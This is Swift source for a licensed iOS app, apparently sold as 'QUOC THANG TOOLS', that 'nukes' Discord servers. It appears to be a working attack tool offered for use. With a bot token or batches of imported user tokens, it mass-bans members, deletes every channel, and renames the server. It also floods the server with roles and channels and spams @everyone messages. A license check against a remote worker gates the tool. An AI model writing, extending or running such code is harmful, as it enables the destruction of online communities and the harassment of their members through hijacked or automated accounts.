    func setToken(_ s: String) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty else { return }
        isCheckingToken = true; tokenError = nil
        do {
            let i = try await BotClient(token: c).validate()
            guard i.bot == true else { tokenError = "Không phải bot token"; isCheckingToken = false; return }
            let raw = c.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
            config = BotConfig(token: raw, username: i.username, userId: i.id, avatarHash: i.avatar, discriminator: i.discriminator)
            await loadGuilds()
        } catch { tokenError = error.localizedDescription }
        isCheckingToken = false
    }
    func removeConfig() { config = nil; botGuilds = []; nukeLog = [] }
    func loadGuilds() async {
        guard let c = client else { return }
        isLoadingGuilds = true
        do { botGuilds = try await c.getGuilds().sorted { $0.name < $1.name }; tokenError = nil }
        catch { tokenError = error.localizedDescription }
        isLoadingGuilds = false
    }
    func stopNuke() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard let c = client else { return }
        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        let gid = guild.id
        log("Bắt đầu nuke: \(guild.name)")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            switch step {
            case .massBan: await doMassBan(c, gid, options: options)
            case .deleteChannels: await doDeleteChannels(c, gid, options: options)
            case .renameGuild:
                if !options.newGuildName.isEmpty {
                    do { try await c.renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                rolesCreated = await doCreateRoles(c, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let (cc, ss) = await doCreateChannels(c, gid, options: options)
                channelsCreated = cc; messagesSent = ss
                log("  Kênh đã tạo: \(cc), tin đã gửi: \(ss)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop()
    }

    private func doMassBan(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        guard let cfg = config else { return }
        do {
            let detail = try await c.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let botMember = try await c.getMember(gid, userId: cfg.userId)
            let roles = try await c.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let botMax = (botMember.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Bot role pos: \(botMax)")
            guard botMax > 0 else { log("  Bot role quá thấp"); return }
            var after = "0"
            while !isCancelled {
                let members: [BotMember]
                do { members = try await c.getMembers(gid, after: after) }
                catch {
                    log("  Lỗi: \(error.localizedDescription)")
                    if error.localizedDescription.contains("403") { log("  Bật SERVER MEMBERS INTENT") }
                    return
                }
                if members.isEmpty { break }
                for m in members {
                    if isCancelled { break }
                    guard let uid = m.user?.id else { continue }
                    if uid == cfg.userId || uid == ownerId || m.user?.bot == true { continue }
                    let pos = (m.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
                    if pos >= botMax { continue }
                    do { try await c.banMember(gid, userId: uid); banSuccess += 1 }
                    catch { banFailed += 1 }
                    if options.banDelay > 0 {
                        try? await Task.sleep(nanoseconds: UInt64(options.banDelay * 1_000_000_000))
                    }
                    if (banSuccess + banFailed) % 10 == 0 {
                        log("  Ban: \(banSuccess) OK / \(banFailed) FAIL")
                    }
                }
                if members.count < 1000 { break }
                after = members.last?.user?.id ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await c.getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for ch in chans {
                    if isCancelled { break }
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await c.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ c: BotClient, _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let d = options.createRoleDelay
                let name = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await c.createRole(gid, name: name); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let cd = options.createChDelay
                let md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await c.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await c.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

// ==========================================
// MARK: - USER NUKE MANAGER
// ==========================================
@MainActor
class UserNukeManager: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isImporting = false
    @Published var importError: String?
    @Published var tokenGuilds: [UUID: [NukeGuild]] = [:]
    @Published var eligibleGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    @Published var membersScanned = 0

    private var isCancelled = false
    private let key = "UserNukeTokensV1"

    init() { loadTokens() }
    private func saveTokens() {
        if let d = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(d, forKey: key) }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: key),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) { tokens = s }
    }
    func addTokenManually(_ raw: String) async -> Bool {
        let clean = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return false }
        isImporting = true
        defer { isImporting = false }
        do {
            let u = try await UserNukeClient(token: clean).validate()
            tokens.append(TokenInfo(token: clean, userId: u.id,
                                    username: u.globalName ?? u.username,
                                    avatarHash: u.avatar, isValid: true))
            return true
        } catch {
            tokens.append(TokenInfo(token: clean, userId: "0",
                                    username: "Token chết", avatarHash: nil, isValid: false))
            return false
        }
    }
    func importFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { importError = "Không đọc được file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { importError = "File rỗng"; return }
        let lines = t.replacingOccurrences(of: "\u{FEFF}", with: "")
            .components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        guard !lines.isEmpty else { importError = "Không có token"; return }
        isImporting = true; importError = nil
        for line in lines {
            if tokens.contains(where: { $0.token == line }) { continue }
            do {
                let u = try await UserNukeClient(token: line).validate()
                tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true))
            } catch {
                tokens.append(TokenInfo(token: line, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
            }
        }
        isImporting = false
    }
    func removeToken(_ id: UUID) {
        tokens.removeAll { $0.id == id }
        selectedTokenIds.remove(id); tokenGuilds.removeValue(forKey: id); recomputeEligible()
    }
    func clearAll() { tokens = []; selectedTokenIds = []; tokenGuilds = [:]; eligibleGuilds = [] }
    func clearSelection() { selectedTokenIds = []; eligibleGuilds = [] }
    func toggleSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) { selectedTokenIds.remove(t.id) }
        else { selectedTokenIds.insert(t.id) }
        recomputeEligible()
        if !tokenGuilds.keys.contains(t.id) { Task { await loadGuildsForToken(t) } }
    }
    func loadAllGuildsForSelected() async {
        isLoadingGuilds = true
        for id in selectedTokenIds {
            guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
            await loadGuildsForToken(t)
        }
        recomputeEligible(); isLoadingGuilds = false
    }
    private func loadGuildsForToken(_ t: TokenInfo) async {
        do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
        catch { tokenGuilds[t.id] = [] }
        recomputeEligible()
    }
    func recomputeEligible() {
        guard !selectedTokenIds.isEmpty else { eligibleGuilds = []; return }
        var unionIds: Set<String> = []
        var unionMap: [String: NukeGuild] = [:]
        for id in selectedTokenIds {
            guard let gs = tokenGuilds[id] else { eligibleGuilds = []; return }
            for g in gs where g.canDoAnything {
                unionIds.insert(g.id)
                if unionMap[g.id] == nil { unionMap[g.id] = g }
            }
        }
        eligibleGuilds = unionIds.compactMap { unionMap[$0] }
            .map { Guild(id: $0.id, name: $0.name, icon: $0.icon) }
            .sorted { $0.name < $1.name }
    }
    func permissionsForGuild(_ guildId: String) -> GuildPermissions {
        var perms = GuildPermissions()
        for tokenId in selectedTokenIds {
            guard let gs = tokenGuilds[tokenId],
                  let g = gs.first(where: { $0.id == guildId }) else { continue }
            if g.canMassBan { perms.massBan = true }
            if g.canDeleteChannels { perms.deleteChannels = true }
            if g.canCreateChannels { perms.createChannels = true }
            if g.canCreateRoles { perms.createRoles = true }
            if g.canRenameGuild { perms.renameGuild = true }
        }
        return perms
    }
    private func clientsWithBanPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canMassBan ?? false }.map { $0.1 }
    }
    private func clientsWithChannelPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in
            let g = tokenGuilds[id]?.first(where: { $0.id == guildId })
            return g?.canDeleteChannels ?? false || g?.canCreateChannels ?? false
        }.map { $0.1 }
    }
    private func clientsWithRolePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canCreateRoles ?? false }.map { $0.1 }
    }
    private func clientsWithRenamePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canRenameGuild ?? false }.map { $0.1 }
    }
    func stop() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; membersScanned = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard !selectedTokenIds.isEmpty else { return }
        let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !sel.isEmpty else { return }

        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        let gid = guild.id
        let allClients: [(UUID, UserNukeClient)] = sel.map { ($0.id, UserNukeClient(token: $0.token)) }
        guard let scan = allClients.first?.1 else { return }

        log("Bắt đầu nuke: \(guild.name)")
        log("Dùng \(allClients.count) token")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            switch step {
            case .massBan:
                let bc = clientsWithBanPerm(guildId: gid, all: allClients)
                if bc.isEmpty { log("  Bỏ qua: không token nào có quyền ban"); break }
                await doMassBanScan(scan, clients: bc, gid: gid, options: options)
            case .deleteChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                await doDeleteChannels(cc, gid, options: options)
            case .renameGuild:
                let rc = clientsWithRenamePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền đổi tên"); break }
                if !options.newGuildName.isEmpty {
                    do { try await rc[0].renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                let rc = clientsWithRolePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý role"); break }
                rolesCreated = await doCreateRoles(rc, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                let (c, s) = await doCreateChannels(cc, gid, options: options)
                channelsCreated = c; messagesSent = s
                log("  Kênh đã tạo: \(c), tin đã gửi: \(s)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop()
    }

    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, options: NukeConfig) async {
        do {
            let roles = try await scan.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let detail = try await scan.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let myUser = try await scan.validate()
            let myM = try await scan.getMember(gid, uid: myUser.id)
            let myMax = (myM.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Scan role pos: \(myMax)")

            var rolePosition = 0
            var filterByRole = false
            if !options.banRoleId.isEmpty, let tr = roleMap[options.banRoleId] {
                rolePosition = tr.position; filterByRole = true
                log("  Ban theo role: \(tr.name) (pos \(rolePosition))")
            }

            var candidates: [String] = []
            let lock = NSLock()
            log("  Đang quét WS...")
            do {
                try await scan.fetchMembersWS(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
                    if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            } catch {
                log("  WS lỗi: \(error.localizedDescription) — thử HTTP")
                await scan.fetchMembersHTTP(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); lock.unlock()
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            }

            log("  Tìm thấy \(candidates.count) target")
            guard !candidates.isEmpty else { log("  Không có ai để ban"); return }

            let queue = candidates
            let idxBox = IndexBox()
            let delay = options.banDelay
            let manager = self

            await withTaskGroup(of: Void.self) { group in
                for client in clients {
                    group.addTask {
                        while !(await manager.isCancelled) {
                            let i = idxBox.next()
                            if i >= queue.count { break }
                            let uid = queue[i]
                            if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) }
                            do {
                                try await client.banMember(gid, uid: uid)
                                await MainActor.run { manager.banSuccess += 1 }
                            } catch {
                                await MainActor.run { manager.banFailed += 1 }
                            }
                        }
                    }
                }
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await clients[0].getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            let idx = IndexBox(); var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for _ in 0..<chans.count {
                    if isCancelled { break }
                    let client = clients[Int.random(in: 0..<clients.count)]
                    let i = idx.next()
                    if i >= chans.count { break }
                    let ch = chans[i]
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await client.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let d = options.createRoleDelay
                let n = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await client.createRole(gid, name: n); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let cd = options.createChDelay, md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await client.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await client.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

final class IndexBox: @unchecked Sendable {
    private var value = 0
    private let lock = NSLock()
    func next() -> Int { lock.lock(); defer { lock.unlock() }; let v = value; value += 1; return v }
}

// ==========================================
// MARK: - LICENSE API
// ==========================================
struct LicenseActivationResponse: Codable {
    let valid: Bool
    let expiresAt: Int64?
    let message: String?
    let error: String?
}

struct LicenseValidationResponse: Codable {
    let valid: Bool
    let expiresAt: Int64?
    let error: String?
}

enum LicenseStatus: Equatable {
    case notActivated
    case checking
    case valid(expiresOn: Date)
    case expired(expiresOn: Date)
    case invalid(reason: String)
}

final class LicenseAPIClient {
    static let shared = LicenseAPIClient()

    // ⚠️ ĐỔI URL NÀY thành URL Worker của bạn
    let baseURL = "https://key.nqtaf01.workers.dev"

    private func machineID() -> String {
        let raw = "\(UIDevice.current.identifierForVendor?.uuidString ?? "unknown")-\(Bundle.main.bundleIdentifier ?? "app")"
        let hash = SHA256.hash(data: Data(raw.utf8))
        return hash.compactMap { String(format: "%02x", $0) }.joined()
    }

    func activate(key: String) async throws -> LicenseActivationResponse {
        var req = URLRequest(url: URL(string: "\(baseURL)/activate")!)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.timeoutInterval = 15
        req.httpBody = try JSONSerialization.data(withJSONObject: [
            "license_key": key,
            "machine_id": machineID()
        ])
        let (data, _) = try await URLSession.shared.data(for: req)
        return try JSONDecoder().decode(LicenseActivationResponse.self, from: data)
    }

    func validate(key: String) async throws -> LicenseValidationResponse {
        var req = URLRequest(url: URL(string: "\(baseURL)/validate")!)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.timeoutInterval = 15
        req.httpBody = try JSONSerialization.data(withJSONObject: ["license_key": key])
        let (data, _) = try await URLSession.shared.data(for: req)
        return try JSONDecoder().decode(LicenseValidationResponse.self, from: data)
    }
}

@MainActor
final class LicenseManager: ObservableObject {
    static let shared = LicenseManager()

    @Published var status: LicenseStatus = .notActivated
    @Published var licenseKey: String? = nil
    @Published var isChecking = false

    private let keyStoreKey = "QT_LicenseKey_Server"
    private let expiryStoreKey = "QT_LicenseExpiry"
    private let lastCheckKey = "QT_LicenseLastCheck"

    init() {
        self.licenseKey = UserDefaults.standard.string(forKey: keyStoreKey)
        if licenseKey == nil {
            status = .notActivated
        } else if let cachedExp = UserDefaults.standard.object(forKey: expiryStoreKey) as? Date {
            status = Date() > cachedExp ? .expired(expiresOn: cachedExp) : .valid(expiresOn: cachedExp)
        }
        Task { @MainActor [weak self] in
            await self?.refreshStatus()
        }
    }

    func activate(key: String) async -> LicenseStatus {
        let clean = key.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        guard !clean.isEmpty else {
            status = .invalid(reason: "Key trống")
            return status
        }
        isChecking = true
        defer { isChecking = false }
        do {
            let res = try await LicenseAPIClient.shared.activate(key: clean)
            if res.valid, let expMs = res.expiresAt {
                let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
                UserDefaults.standard.set(clean, forKey: keyStoreKey)
                UserDefaults.standard.set(exp, forKey: expiryStoreKey)
                UserDefaults.standard.set(Date(), forKey: lastCheckKey)
                licenseKey = clean
                status = .valid(expiresOn: exp)
                return status
            } else {
                status = .invalid(reason: res.error ?? "Key không hợp lệ")
                return status
            }
        } catch {
            status = .invalid(reason: "Lỗi kết nối: \(error.localizedDescription)")
            return status
        }
    }

    func refreshStatus() async {
        guard let key = licenseKey else {
            status = .notActivated
            return
        }
        isChecking = true
        defer { isChecking = false }

        do {
            let res = try await LicenseAPIClient.shared.validate(key: key)
            if res.valid, let expMs = res.expiresAt {
                let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
                UserDefaults.standard.set(exp, forKey: expiryStoreKey)
                UserDefaults.standard.set(Date(), forKey: lastCheckKey)
                status = .valid(expiresOn: exp)
                return
            } else {
                status = .invalid(reason: res.error ?? "Key không hợp lệ")
                return
            }
        } catch {
            if let cachedExp = UserDefaults.standard.object(forKey: expiryStoreKey) as? Date {
                if Date() > cachedExp {
                    status = .expired(expiresOn: cachedExp)
                } else {
                    status = .valid(expiresOn: cachedExp)
                }
            } else {
                status = .invalid(reason: "Không kết nối được server")
            }
        }
    }

    func deactivate() {
        UserDefaults.standard.removeObject(forKey: keyStoreKey)
        UserDefaults.standard.removeObject(forKey: expiryStoreKey)
        UserDefaults.standard.removeObject(forKey: lastCheckKey)
        licenseKey = nil
        status = .notActivated
    }

    var isUnlocked: Bool {
        if case .valid = status { return true }
        return false
    }

    var statusText: String {
        switch status {
        case .notActivated: return "Chưa kích hoạt"
        case .checking: return "Đang kiểm tra..."
        case .valid(let d): return "Còn hạn đến \(formatDate(d))"
        case .expired(let d): return "Đã hết hạn ngày \(formatDate(d))"
        case .invalid(let r): return r
        }
    }

    private func formatDate(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "dd/MM/yyyy"
        return df.string(from: d)
    }
}

// ==========================================
// MARK: - LOCK VIEW
// ==========================================
struct LockView: View {
    @EnvironmentObject var license: LicenseManager
    @State private var input = ""
    @State private var error: String? = nil
    @State private var showAdminInfo = false
    @State private var logoTapCount = 0

    var body: some View {
        ZStack {
            LinearGradient(
                colors: [Color(red: 0.08, green: 0.08, blue: 0.16), Color.black],
                startPoint: .top, endPoint: .bottom
            ).ignoresSafeArea()

            ScrollView {
                VStack(spacing: 24) {
                    Spacer(minLength: 40)

                    VStack(spacing: 14) {
                        Image(systemName: "lock.shield.fill")
                            .font(.system(size: 80))
                            .foregroundStyle(.red)
                            .shadow(color: .red.opacity(0.4), radius: 20)
                            .onTapGesture {
                                logoTapCount += 1
                                if logoTapCount >= 7 {
                                    logoTapCount = 0
                                    showAdminInfo = true
                                }
                            }

                        Text("QUOC THANG TOOLS")
                            .font(.system(size: 22, weight: .heavy))
                            .foregroundStyle(.white)
                            .tracking(1.5)

                        Text("LICENSE REQUIRED")
                            .font(.caption.bold())
                            .foregroundStyle(.red.opacity(0.8))
                            .tracking(3)
                    }

                    VStack(spacing: 14) {
                        TextField("Nhập license key...", text: $input)
                            .textInputAutocapitalization(.characters)
                            .autocorrectionDisabled()
                            .font(.system(.body, design: .monospaced))
                            .padding(14)
                            .background(Color.white.opacity(0.08))
                            .foregroundStyle(.white)
                            .cornerRadius(10)
                            .overlay(
                                RoundedRectangle(cornerRadius: 10)
                                    .stroke(Color.white.opacity(0.15), lineWidth: 1)
                            )
                            .onChange(of: input) { _ in error = nil }

                        if let e = error {
                            Text(e).font(.caption).foregroundStyle(.red)
                                .multilineTextAlignment(.center)
                                .padding(.horizontal)
                        }

                        Button {
                            Task {
                                error = nil
                                let st = await license.activate(key: input)
                                switch st {
                                case .valid:
                                    error = nil
                                case .invalid(let r):
                                    error = r
                                case .expired(let d):
                                    error = "Key đã hết hạn ngày \(fmt(d))"
                                default:
                                    error = "Không thể kích hoạt"
                                }
                            }
                        } label: {
                            HStack {
                                if license.isChecking { ProgressView().tint(.white) }
                                Text(license.isChecking ? "ĐANG KIỂM TRA..." : "KÍCH HOẠT").bold()
                            }.frame(maxWidth: .infinity).padding()
                        }
                        .background(input.trimmingCharacters(in: .whitespaces).isEmpty ? Color.gray : Color.indigo)
                        .foregroundStyle(.white)
                        .cornerRadius(10)
                        .disabled(input.trimmingCharacters(in: .whitespaces).isEmpty || license.isChecking)
                    }
                    .padding(.horizontal, 30)

                    if case .expired(let d) = license.status {
                        Text("⚠️ Key trước đó đã hết hạn ngày \(fmt(d))")
                            .font(.caption).foregroundStyle(.orange)
                            .multilineTextAlignment(.center)
                            .padding(.horizontal)
                    }

                    Spacer(minLength: 20)

                    Text("v1.0").font(.caption2).foregroundStyle(.gray.opacity(0.4))
                }
                .padding(.vertical, 20)
            }
        }
        .sheet(isPresented: $showAdminInfo) {
